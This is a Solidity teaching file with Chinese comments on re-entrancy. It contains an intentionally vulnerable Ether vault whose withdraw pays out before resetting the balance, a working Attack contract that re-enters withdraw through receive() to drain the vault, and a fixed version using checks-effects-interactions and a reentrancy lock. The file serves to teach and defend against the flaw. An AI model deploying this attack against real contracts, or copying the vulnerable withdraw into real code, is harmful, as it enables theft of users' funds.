// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/**
 * Re-Entrancy 漏洞本质上是一个状态同步问题。当智能合约调用外部函数时，执行流会转移到被调用的合约。
 * 如果调用合约未能正确同步状态，就可能在转移执行流时被再次调用，从而重复执行相同的代码逻辑。
 *
 * 具体来说,攻击往往分两步:
 * 1.被攻击的合约调用了攻击合约的外部函数，并转移了执行流。
 * 2.在攻击合约函数中，利用某些技巧再次调用被攻击合约的漏洞函数。
 *
 * 由于 EVM 是单线程的，重新进入漏洞函数时，合约状态并未被正确更新，就像第一次调用一样。
 * 这样攻击者就能够多次重复执行一些代码逻辑，从而实现非预期的行为。典型的攻击模式是多次重复提取资金。
 */

/*/////////////////////////////////////////////
                被攻击合约 
/////////////////////////////////////////////*/
// 金库合约
contract EtherBank {
    error SendEthIsZeroError();
    error EtherIsZeroError();
    error WithdrawEthError();

    // 账户余额
    mapping(address => uint256) public balances;

    // 存款
    function deposit() public payable {
        if (msg.value == 0) {
            revert SendEthIsZeroError(); // 转入的Ether不能为0
        }
        balances[msg.sender] += msg.value; // 存入Eth余额
    }

    // 提款
    function withdraw() public {
        address depositer = msg.sender;
        uint256 balance = balances[depositer];
        // 检查余额是否足够
        if (balance <= 0) {
            revert EtherIsZeroError();
        }
        // 取款
        (bool success,) = depositer.call{value: balance}("");
        if (!success) {
            revert WithdrawEthError();
        }
        balances[depositer] = 0; // 重置余额
    }

    // 获取合约余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // 获取账户余额
    function getAccountBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }
}

/*/////////////////////////////////////////////
                攻击合约 
/////////////////////////////////////////////*/
contract Attack {
    EtherBank public etherBank; // 声明被攻击合约
    uint256 public constant AMOUNT = 1 ether;

    constructor(address _etherBankAddress) {
        etherBank = EtherBank(_etherBankAddress); // 赋予被攻击合约地址
    }

    function attack() external payable {
        etherBank.deposit{value: msg.value}(); // 存款
        etherBank.withdraw(); // 提款
    }

    // 当外部账户或合约向当前合约发送ether或者msg.data时，receive()函数会被执行
    receive() external payable {
        if (address(etherBank).balance >= AMOUNT) {
            etherBank.withdraw(); // 调用完成后，还会再次执行receive()
        }
    }

    // 获取当前合约的金额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

/*/////////////////////////////////////////////
                修复合约
/////////////////////////////////////////////*/
/**
 *  防御措施
 *  1、最直接有效的防御手段,就是遵循 Check-Effects-Interactions(CEI) 模式
 *  2、是使用OpenZeppelin 提供了 Guards 代码 ReentrancyGuard
 */
// 金库合约
contract EtherBankFix {
    error SendEthIsZeroError();
    error EtherIsZeroError();
    error WithdrawEthError();

    // 账户余额
    mapping(address => uint256) public balances;

    bool internal locked;

    modifier nonReentrant() {
        require(!locked, "No reentrancy");
        locked = true;
        _;
        locked = false;
    }

    // 存款
    function deposit() public payable {
        if (msg.value == 0) {
            revert SendEthIsZeroError(); // 转入的Ether不能为0
        }
        balances[msg.sender] += msg.value; // 存入Eth余额
    }

    // 提款
    function withdraw() public nonReentrant {
        // 1.check
        address depositer = msg.sender;
        uint256 balance = balances[depositer];
        // 检查余额是否足够
        if (balance <= 0) {
            revert EtherIsZeroError();
        }
        // 2.effects
        balances[depositer] = 0; // 重置余额

        // 3.interactions
        // 取款
        (bool success,) = depositer.call{value: balance}("");
        if (!success) {
            revert WithdrawEthError();
        }
    }

    // 获取合约余额
    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }

    // 获取账户余额
    function getAccountBalance(address _account) public view returns (uint256) {
        return balances[_account];
    }
}
